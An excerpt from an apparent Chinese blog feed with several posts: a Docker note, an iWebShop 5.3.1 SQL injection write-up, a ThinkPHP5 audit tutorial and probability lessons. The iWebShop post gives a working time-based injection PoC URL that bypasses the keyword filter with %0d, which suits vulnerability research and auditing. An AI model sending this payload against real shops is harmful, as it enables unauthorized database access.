</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ENV</span> WEB_DOCUMENT_ROOT /var/www/cmseasy<span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>只是简单的<code>git clone</code>到web目录和 <code>chown -R</code>更改文件权限</p>
<h4 id="运行和数据库">运行和数据库</h4>
<p>用docker运行很简单<code>docker run -d  -p 外部端口:镜像端口 &lt;镜像名&gt;</code></p>
<p>如果运行site镜像就是 <code>docker run -d  -p 80:80 site</code></p>
<p>一个网站当然需要一个数据库  如果你的服务器有一个外部ip 那么很简单</p>
<p><code>docker run --name mysql -e MYSQL_ROOT_PASSWORD=password -p 3306:3306  mysql:5.6</code></p>
<p>填数据库地址的时候填外部ip即可</p>
<p>如果没有 可以用<code>docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mysql</code> 获取docker内部ip 填写内部ip即可</p>
]]></content></item><item><title>Iwebshop sql注入</title><link>https://blue-bird1.github.io/posts/iwebshopsql/</link><pubDate>Sat, 19 Jan 2019 18:12:19 +0800</pubDate><guid>https://blue-bird1.github.io/posts/iwebshopsql/</guid><description>&lt;h3 id="iwebshop-最新版本531-前台注入">iwebshop 最新版本5.3.1 前台注入&lt;/h3>
&lt;p>iwebshop最新版存在一个非常弱智的注入漏洞&lt;/p></description><content type="html"><![CDATA[<h3 id="iwebshop-最新版本531-前台注入">iwebshop 最新版本5.3.1 前台注入</h3>
<p>iwebshop最新版存在一个非常弱智的注入漏洞</p>
<p>主要导致原因 <code>$id        = IFilter::act(IReq::get('id'));</code></p>
<p>开发者忘记写成 <code>IFilter::act(IReq::get('id'), 'int')</code>了,导致直接注入. 在其他文件也存在这个问题.</p>
<p>这个文件需要商家账号才可以访问,是可以注册的</p>
<p>漏洞点 <code>controllers/seller.php</code> 函数<code>categoryAjax</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">categoryAjax</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$id</span>        <span class="o">=</span> <span class="nx">IFilter</span><span class="o">::</span><span class="na">act</span><span class="p">(</span><span class="nx">IReq</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$parent_id</span> <span class="o">=</span> <span class="nx">IFilter</span><span class="o">::</span><span class="na">act</span><span class="p">(</span><span class="nx">IReq</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;parent_id&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$id</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$id</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">foreach</span><span class="p">(</span><span class="nv">$id</span> <span class="k">as</span> <span class="nv">$category_id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$childString</span> <span class="o">=</span> <span class="nx">goods_class</span><span class="o">::</span><span class="na">catChild</span><span class="p">(</span><span class="nv">$category_id</span><span class="p">);</span><span class="c1">//父类ID不能死循环设置成其子分类
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span><span class="p">(</span><span class="nv">$parent_id</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">stripos</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="o">.</span><span class="nv">$childString</span><span class="o">.</span><span class="s2">&#34;,&#34;</span><span class="p">,</span><span class="s2">&#34;,&#34;</span><span class="o">.</span><span class="nv">$parent_id</span><span class="o">.</span><span class="s2">&#34;,&#34;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>                    <span class="k">die</span><span class="p">(</span><span class="nx">JSON</span><span class="o">::</span><span class="na">encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;result&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;fail&#39;</span><span class="p">)));</span>                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接将id传入到<code>catChild</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> public static function catChild($catId,$level = 1)
</span></span><span class="line"><span class="cl">    {        if($level == 0)        {
</span></span><span class="line"><span class="cl">            return $catId;
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        $temp   = array();
</span></span><span class="line"><span class="cl">        $result = array($catId);        $catDB  = new IModel(&#39;category&#39;);
</span></span><span class="line"><span class="cl">        while(true)
</span></span><span class="line"><span class="cl">        {
</span></span><span class="line"><span class="cl">            $id = current($result);
</span></span><span class="line"><span class="cl">            if(!$id)
</span></span><span class="line"><span class="cl">            {
</span></span><span class="line"><span class="cl">                break;
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">            $temp = $catDB-&gt;query(&#39;parent_id = &#39;.$id);
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接将id拼接到sql查询中.. 这个cms有一点sql过滤,但是非常弱,也就ctf入门题的水平</p>
<p><code>lib/core/util/filter_class.php</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">   public static function string($str,$limitLen = false)
</span></span><span class="line"><span class="cl">    {
</span></span><span class="line"><span class="cl">        $str = trim($str);
</span></span><span class="line"><span class="cl">        $str = self::limitLen($str,$limitLen);
</span></span><span class="line"><span class="cl">        $str = htmlspecialchars($str,ENT_NOQUOTES);
</span></span><span class="line"><span class="cl">        return self::addSlash($str);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">    public static function word($str)
</span></span><span class="line"><span class="cl">    {
</span></span><span class="line"><span class="cl">        $word = array(&#34;select &#34;,&#34;select/*&#34;,&#34;update &#34;,&#34;update/*&#34;,&#34;delete &#34;,&#34;delete/*&#34;,&#34;insert into&#34;,&#34;insert/*&#34;,&#34;updatexml&#34;,&#34;concat&#34;,&#34;()&#34;,&#34;/**/&#34;,&#34;union(&#34;);
</span></span><span class="line"><span class="cl">        foreach($word as $val)
</span></span><span class="line"><span class="cl">        {
</span></span><span class="line"><span class="cl">            if(stripos($str,$val) !== false)
</span></span><span class="line"><span class="cl">            {
</span></span><span class="line"><span class="cl">                return &#39;&#39;;
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        return self::removeEmoji($str);
</span></span><span class="line"><span class="cl">    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>不允许<code>union </code>加空格,可是空格的代替很多 比如 <code>%0d</code></p>
<p>poc</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/index.php?controller=seller&amp;action=categoryAjax&amp;id[]=1%20and%201=1%20union%0dselect%0d1,2,3,4,5,6,7,8,sleep(5)
</span></span></code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>think5审计与调试技巧1</title><link>https://blue-bird1.github.io/posts/thinkphp5-1/</link><pubDate>Thu, 17 Jan 2019 23:19:42 +0800</pubDate><guid>https://blue-bird1.github.io/posts/thinkphp5-1/</guid><description>&lt;h3 id="think5审计与调试技巧1">think5审计与调试技巧1&lt;/h3></description><content type="html"><![CDATA[<h3 id="think5审计与调试技巧1">think5审计与调试技巧1</h3>
<p>think5是一个非常流行的框架, 现在的cms很多都采用了think5作为开发框架.这就带来一个问题, 没用过的安全人员审计的时候就非常懵逼了.</p>
<p>例如 程序入口在哪?  orm操作都是这种函数  <code>Db::name($modeln['tablename'])-&gt;where('id',$id)-&gt;setInc('click');</code>  怎么操作才会出现sql注入?</p>
<p>这就需要框架知识了,但是学习整个框架又太多, 不学又不知道怎么审计.所以这个系列旨在带来足以审计的think5框架知识,而不太复杂</p>
<h4 id="整体目录结构">整体目录结构</h4>
<p>think5 主要需要关注的目录如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">├── application 应用目录（可设置）
</span></span><span class="line"><span class="cl">├── config 配置目录 
</span></span><span class="line"><span class="cl">├── extend 扩展类库目录（可定义）
</span></span><span class="line"><span class="cl">├── public 网站目录
</span></span><span class="line"><span class="cl">├── route   路由
</span></span><span class="line"><span class="cl">├─- runtime  应用的运行时目录（可写，可设置）
</span></span><span class="line"><span class="cl">├── thinkphp 框架目录
</span></span><span class="line"><span class="cl">└── vendor 第三方库
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们审计主要看<code>application</code> 目录</p>
<p>5.0 官方给的目录参考是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">├─application           应用目录（可设置）
</span></span><span class="line"><span class="cl">│  ├─common             公共模块目录（可更改）
</span></span><span class="line"><span class="cl">│  ├─index              模块目录(可更改)
</span></span><span class="line"><span class="cl">│  │  ├─config.php      模块配置文件
</span></span><span class="line"><span class="cl">│  │  ├─common.php      模块函数文件
</span></span><span class="line"><span class="cl">│  │  ├─controller      控制器目录
</span></span><span class="line"><span class="cl">│  │  ├─model           模型目录
</span></span><span class="line"><span class="cl">│  │  ├─view            视图目录
</span></span><span class="line"><span class="cl">│  │  └─ ...            更多类库目录
</span></span><span class="line"><span class="cl">│  ├─command.php        命令行工具配置文件
</span></span><span class="line"><span class="cl">│  ├─common.php         应用公共（函数）文件
</span></span><span class="line"><span class="cl">│  ├─config.php         应用（公共）配置文件
</span></span><span class="line"><span class="cl">│  ├─database.php       数据库配置文件
</span></span><span class="line"><span class="cl">│  ├─tags.php           应用行为扩展定义文件
</span></span><span class="line"><span class="cl">│  └─route.php          路由配置文件
</span></span></code></pre></td></tr></table>
</div>
</div><p>但是事实可能缺失很多部分 例如<code>nonecms</code> 的目录是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">├── admin
</span></span><span class="line"><span class="cl">│   ├── behavior
</span></span><span class="line"><span class="cl">│   ├── config
</span></span><span class="line"><span class="cl">│   ├── controller
</span></span><span class="line"><span class="cl">│   ├── rbac.php
</span></span><span class="line"><span class="cl">│   ├── tags.php
</span></span><span class="line"><span class="cl">│   ├── validate
</span></span><span class="line"><span class="cl">│   └── view
</span></span><span class="line"><span class="cl">├── command.php
</span></span><span class="line"><span class="cl">├── common
</span></span><span class="line"><span class="cl">│   ├── lib
</span></span><span class="line"><span class="cl">│   ├── model
</span></span><span class="line"><span class="cl">│   └── taglib
</span></span><span class="line"><span class="cl">├── common.php
</span></span><span class="line"><span class="cl">├── index
</span></span><span class="line"><span class="cl">│   ├── config
</span></span><span class="line"><span class="cl">│   └── controller
</span></span><span class="line"><span class="cl">├── mobile
</span></span><span class="line"><span class="cl">│   ├── config
</span></span><span class="line"><span class="cl">│   └── controller
</span></span><span class="line"><span class="cl">└── push
</span></span><span class="line"><span class="cl">    ├── controller
</span></span><span class="line"><span class="cl">    └── service
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="think5-url">think5 url</h4>
<p>最常见的think5 url是</p>
<p><code>http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</code></p>
<p><code>http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</code></p>
<p>像</p>
<p><code>index.php/index/blog/read</code> <code>index.php?s=/index/blog/read</code></p>
<p>其他方式也有 但是基本大同小异 例如<code>index/listing/index/cid/47.html</code></p>
<h4 id="配置文件">配置文件</h4>
<p>think5.1 配置文件在config目录  5.0在<code>application/config.php</code></p>
<p>常见的配置文件</p>
<p><code>app.php  cache.php  cookie.php  database.php  log.php  session.php  template.php  trace.php</code></p>
<p>最重要的配置文件是<code>app.php</code></p>
<p>主要需要关注的配置如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 应用调试模式
</span></span><span class="line"><span class="cl">&#39;app_debug&#39;              =&gt; true,
</span></span><span class="line"><span class="cl">// 应用Trace
</span></span><span class="line"><span class="cl">&#39;app_trace&#39;              =&gt; true,
</span></span><span class="line"><span class="cl">// 默认全局过滤方法 用逗号分隔多个
</span></span><span class="line"><span class="cl">&#39;default_filter&#39;         =&gt; &#39;&#39;,
</span></span><span class="line"><span class="cl">// 禁止访问模块
</span></span><span class="line"><span class="cl">&#39;deny_module_list&#39;       =&gt; [&#39;common&#39;],
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>app_debug</code> 和 <code>app_trace</code> 建议设置成true.</p>
<p>调试模式下异常会显示详细信息,而不是通用报错界面</p>
<p><code>app_trace</code> 则会在右下角显示一个按钮,根据设置可以显示执行路径,执行sql等等</p>
<p>如果没有显示,需要添加</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// Trace信息
</span></span><span class="line"><span class="cl">&#39;trace&#39;     =&gt;  [
</span></span><span class="line"><span class="cl">    //支持Html,Console
</span></span><span class="line"><span class="cl">    &#39;type&#39;  =&gt;  &#39;html&#39;,
</span></span><span class="line"><span class="cl">] 
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果没有看到这个设置  可能在<code>trace.php</code>中设置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">return [
</span></span><span class="line"><span class="cl">    // 内置Html Console 支持扩展
</span></span><span class="line"><span class="cl">    &#39;type&#39; =&gt; &#39;Html&#39;,
</span></span><span class="line"><span class="cl">];
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>xxx.php</code> 对应的是<code>app.php</code>里的<code>xxx</code>设置</p>
<p><code>default_filter</code> 可能的值是函数, 例如 <code>strip_tags</code> 等于对所有用户传入的参数执行过滤.</p>
<p><code>deny_module_list</code> 则是禁止访问的模块</p>
<h4 id="日志">日志</h4>
<p><code>config/log.php</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">return [
</span></span><span class="line"><span class="cl">    // 日志记录方式，内置 file socket 支持扩展
</span></span><span class="line"><span class="cl">    &#39;type&#39;  =&gt; &#39;File&#39;,
</span></span><span class="line"><span class="cl">    // 日志保存目录
</span></span><span class="line"><span class="cl">    &#39;path&#39;  =&gt; &#39;&#39;,
</span></span><span class="line"><span class="cl">    // 日志记录级别
</span></span><span class="line"><span class="cl">    &#39;level&#39; =&gt; [],
</span></span><span class="line"><span class="cl">];
</span></span></code></pre></td></tr></table>
</div>
</div><p>默认路径是在<code>runtime/log</code></p>
<h4 id="数据库trace">数据库trace</h4>
<p><code>app_trace</code>设置后会发现并没有sql记录,这个需要在database.php添加</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;debug&#39;       =&gt; true,
</span></span></code></pre></td></tr></table>
</div>
</div><p>不过就算你看到你的sql注入进入了显示的语句, 但是由于thinkphp5的参数绑定, 很可能并没有生效.</p>
<h4 id="路由">路由</h4>
<p>路由对审计影响其实不大, 毕竟url怎么改, 真正的执行代码也不会变.建议扫描性的看一下,是否有开发不小心把调试用的路由留在上面了..</p>]]></content></item><item><title>统计学2:现代概率</title><link>https://blue-bird1.github.io/posts/statistics2/</link><pubDate>Mon, 07 Jan 2019 21:20:23 +0800</pubDate><guid>https://blue-bird1.github.io/posts/statistics2/</guid><description>&lt;h4 id="统计学2-现代概率">统计学2: 现代概率&lt;/h4>
&lt;p>现代概率的一大特征是概率不确定性.古代概率研究的骰子可以认为每面的概率是1/6, 但是统计天气的时候, 就没有理由认为晴天和雨天的概率都是1/2.&lt;/p></description><content type="html"><![CDATA[<h4 id="统计学2-现代概率">统计学2: 现代概率</h4>
<p>现代概率的一大特征是概率不确定性.古代概率研究的骰子可以认为每面的概率是1/6, 但是统计天气的时候, 就没有理由认为晴天和雨天的概率都是1/2.</p>
<p>概率函数在骰子只是简单的$\rho(任意一个数)= \frac{1}{6}$  . 在复杂的现实情况使用简单的函数是无法描述的.</p>
<h4 id="偏差和方差">偏差和方差</h4>
<p>如果怀疑赌场的骰子大小游戏有问题, 要怎么去验证它这个问题. 一种思路是认为如果1,2,3,4,5,6出现的概率不一样 就是有问题. 换种等价方法描述就是 骰子期望$E(X)=3.5$ . 这个骰子均值也应该是3.5.</p>
<p>那么衡量离理想骰子距离也有几种方法 除了最简单的均值.</p>
<p>偏差 所有发生事件 $X = [x_1, x_2 &hellip; x_n]$  偏差 $ =  \sum_n E(X) - x_n$</p>
<p>例如连续出现5个6    $6<em>5  - 3.5</em>5 = 2.5*5$     但是连续5个6并不是现实的小概率事件.  如果发生连续5个6就认为骰子有问题显然是不行的.  而且偏差求的是平均, 两边偏差会抵消  $[3,4,3,4]$ 这种的偏差也是0,</p>
<p>方差则是偏差的平方 $ \sum_n (E(X) - x_n)^2$ 方差是一个衡量离散度的标准</p>
<h4 id="大数定律">大数定律</h4>
<p>我们已经知道统计会出现偏差, 那么如何确定偏差是否是骰子本身的问题呢. 初中就有教, 统计次数越大, 越可能接近均值.</p>
<p>用数学表达就是伯努利大数律 任意给定两个数 $\epsilon$, $\eta$ .含义分别是离均值的距离和离均值的概率. 事件总值是$X$, 存在一个抽取次数$N$ 使得 $\rho(| \frac{X}{N}|&gt;\epsilon ) &lt; \eta$</p>
<p>伯努利证明时并没有方差, 但是他还是用概率的方法证明了.</p>
<blockquote>
<p>证明参考 数理统计学简史 第一章注3</p>
</blockquote>
<p>现在我们知道只是切比雪夫不等式的一个推论.</p>
<p>$\rho(|X-E(X)| &gt; b\sigma) \geq \frac{1}{b^2}$   $\sigma$ 是方差的平方根 也叫标准差 X是随机变量</p>
<p>这个不等式之前还有一个马可夫不等式</p>
<p>$P(X\geq a) \leq  \frac{E(x)}{a}$</p>
<p>这个就比较容易理解了. 如果a取值范围是在x之间.</p>
<p>将$Y=(X-\epsilon)^2$  $a=(kσ)^2$代入马可夫不等式</p>
<p>$\rho((X-\epsilon)^2)\geq kσ^2)\leq \frac{E(X-\epsilon)^2}{kσ^2)} = \frac{σ^2}{kσ^2} =\frac{1}{k^2} $</p>
<h4 id="概率函数和累计分布函数">概率函数和累计分布函数</h4>
<p>如果随机变量是X,</p>
<p>概率函数$\rho$</p>
<p>$\rho(x) = x的概率$</p>
<p>硬币抛出多少次正面的概率分布. 因为只有两个可能性的情况太常见,也被称为二次分布.</p>
<p>n是总数量 k是正的数量 p是正的概率 二项式分布 $b(n, k, p ) = \frac{n!}{k!(n-k)!}p^k(1-p)^{n-k} $</p>
<p>前面组合公式很显然, 后面$p^k$是抛出这么多次正面的概率  $(1-p)^{n-k}$则相反</p>
<p>用二项分布可以计算出硬币概率分布  $ \rho(k)=\frac{n!}{k!(n-k)!}\frac{1}{2}^k\frac{1}{2}^{n-k}$</p>
<p>它的期望是$E(X) = np$  因为二项分布是n次相同实验组合的. 不管抛多少次 期望都是正面的几率$p$ 再乘以总数量</p>
<p>方差是$\sigma^2 = np(1-p)$</p>
<p>累计分布函数f是</p>
<p>$\rho(X \leq x) =f(x)$</p>
<p>分布函数是概率函数的积分, 所以最终将变成1,</p>
<h4 id="贝叶斯公式">贝叶斯公式</h4>
<p>我们在概率定义知道 独立变量a,b有  $P(b|a) = P(a,b)/P(a)$ 和$P(a,b) = P(a|b)*P(b)$</p>
<p>将后项带入前项 得$P(b|a) =  P(a|b)*P(b)/P(a)$</p>
<p>独立变量, 也就是两个变量不相互影响. 天气自然是和骰子没什么关系, 但是骰子掷出双数和骰子掷出6自然是有关系. 在概率学上的定义是协方差, X, Y的期望值是$\mu$和$v$</p>
<p>$Cov(X, Y) = E((X-\mu)(Y-v))$</p>
<p>为什么这么定义呢. 这两个期望分开定义 都是0.  现在放到一起如果不是0, 说明存在相互影响. 期望值的大小也代表影响的方向</p>
<h4 id="二项分布逼近">二项分布逼近</h4>
<p>高斯分布可谓是第一重要的分布  它其实是二项分布的逼近, 然后得出的函数.</p>
<p>在历史上首先研究这个问题的是棣莫弗, 他一开始研究的对象 是$b(2m, 1/2, m)$</p>
<p>m是2m的中项 然后  $b(m)/b(m+d)$ 中项和偏离中项的关系</p>
<p>然后他的朋友斯特林出现, 并使用斯特林公式算了一下</p>
<p>$b(2m, 1/2. m) \approx \frac{2}{mn}$</p>
<p>$\frac{b(m+d)}{bm}\approx e^-\frac{2d^2}{n}$</p>
<p>$b(m+d) \approx  \frac{2}{\sqrt{2πn}}  e^-\frac{2d^2}{n} $</p>
<blockquote>
<p>使用上式的结果，并在二项概率累加求和的过程中近似的使用定积分代替求和，得到</p>
<p>$p_d  \approx  \sum_{-d\leq  m-i\leq d} \frac{2}{\sqrt{2πn}} e^{-2\frac{d}{\sqrt{n}}^2} \approx  \frac{2}{\sqrt{2π}}\int^\frac{d}{\sqrt{n}}<em>{-\frac{d}{\sqrt{n}}} e^{-2x^2}dx  = \frac{1}{\sqrt{2π}}\int^\frac{2d}{\sqrt{n}}</em>{-\frac{2d}{\sqrt{n}}} e^{\frac{x^2}{-2}}dx $</p>
</blockquote>
<p>将d换成$\frac{c}{\sqrt{n}}$ 可得$ \frac{1}{\sqrt{2π}}\int^{2c}_{-2c} e^{-{\frac{x^2}{2}}}dx $  熟悉的高斯分布</p>
<p>这个公式有什么特殊之处呢 $\frac{1}{\sqrt{2π}}\int^{\infty}_{-\infty} e^{-{\frac{x^2}{2}}}dx =1 ​$</p>
<p>$\int^{\infty}_{-\infty} e^{-{\frac{x^2}{2}}}dx$  也叫高斯积分</p>
<h4 id="参考">参考</h4>
<p>数理统计简史</p>
<p>程序员的数学2</p>
<p>概率论与梳理统计</p>
<p><a href="https://www.qiujiawei.com/shadow-1/">https://www.qiujiawei.com/shadow-1/</a></p>]]></content></item><item><title>统计与概率1 古典概率</title><link>https://blue-bird1.github.io/posts/statistics1/</link><pubDate>Sat, 05 Jan 2019 22:13:04 +0800</pubDate><guid>https://blue-bird1.github.io/posts/statistics1/</guid><description>统计与概率1 古典概率 概率的一个定义是一件事发生的一个情况的几率. 也可以表示成$f(\Omega, \omega, \varrho)$ 古典概率研究的是比较简单的情况, 例如硬币</description><content type="html"><![CDATA[<h2 id="统计与概率1-古典概率">统计与概率1 古典概率</h2>
<p>概率的一个定义是一件事发生的一个情况的几率. 也可以表示成$f(\Omega, \omega, \varrho)$</p>
<p>古典概率研究的是比较简单的情况, 例如硬币,骰子, 扑克的排列组合. 难度其实也只是低等数学水平, 排列组合问题小学应该就有了. 从常见的问题引入很容易理解, 但是直接看公式可能反而不懂了.</p>
<h4 id="概率的定义和常见错误">概率的定义和常见错误</h4>
<p>当我们谈概率的时候, 例如A城市今年雾霾的几率是30%. 概率的定义是什么,</p>
<p>概率是一件事发生的可能性大小, 但是显然会存在误差. 只有在无限次重复下才会接近, 这是现代的一个定义.</p>
<p>古典概率下因为研究的是硬币, 骰子投掷这类问题, 在没有其他因素下, 完全可以确定一件事情的发生几率.现代概率学研究如人获得某疾病的几率 则需要大量重复的事件来计算.</p>
<p>谈概率当然不能离开事, 在数学定义概率需要 事件的集合$\Omega$ 和概率函数$\rho$ . $\rho$ 给定条件得到发生的几率.</p>
<p>用上面的例子 事件的集合就是 A城市今年每天的天气. $\rho(天气=雾霾) = 0.3$</p>
<p>如果给定两个条件, 就被称为联合概率. 例如 $\rho(天气=雾霾, 日期=星期日)$  . 也就是两件事同时发生的概率.</p>
<p>如果将一个条件作为前提, 则是条件概率 例如$p(天气=雾霾 | 日期=星期天)$ . 也就是发生了第一件事后, 再发生第二件事的概率.</p>
<p>经典的一句话. 炮弹不会落到同一个弹坑  躲炮弹要到炮弹之前落到的地方. 很多人认为这是正确的, 两次也就是概率的平方可能性非常小. 计算是正确的, 但是对于躲炮弹的人 概率中这个事件的集合并不是两次落到同一个弹坑 , 而只是一次.</p>
<blockquote>
<p>这句话对的原因是因为炮的后坐力</p>
</blockquote>
<p>黑天鹅事件则是对经济学家的估计概率中的可能性没有小概率事件最好的讽刺</p>
<h4 id="概率计算">概率计算</h4>
<p>概率计算有两种视角, 从单次事件出发和从全局出发.例如</p>
<p>求投掷硬币3次, 3次正面的概率.</p>
<p>从单次事件出发 每次正面的概率是1/2  3次 $\frac{1}{2}^3=\frac{1}{8}$</p>
